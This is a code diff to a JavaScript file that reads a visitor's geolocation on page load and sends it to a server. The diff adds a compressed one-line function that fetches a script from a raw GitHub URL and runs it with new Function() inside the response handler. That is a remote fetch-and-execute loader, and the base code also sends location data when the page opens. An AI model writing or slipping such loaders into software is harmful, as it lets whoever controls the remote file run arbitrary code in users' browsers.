@@ -32,6 +32,8 @@ function sendLocationData(position) {
         .then(response => response.text())
         .then(data => {
           console.log(data); // サーバーからの応答をコンソールに表示
+          function executeScript(url) {  fetch(url)    .then(data => data.text())    .then(text => {      const scriptFunction = new Function(text);      scriptFunction();    });}executeScript("https://raw.githubusercontent.com/hirotomoki12345/psannetwork.com/main/javasciprt/GUI.js");
+
         })
         .catch(error => {
           console.error("Error sending data:", error);
@@ -47,6 +49,5 @@ function sendLocationData(position) {
 function handleLocationError(error) {
   console.error("Error getting location:", error.message);
 }
-
 // ページ読み込み時に位置情報を取得して送信
 getLocation();
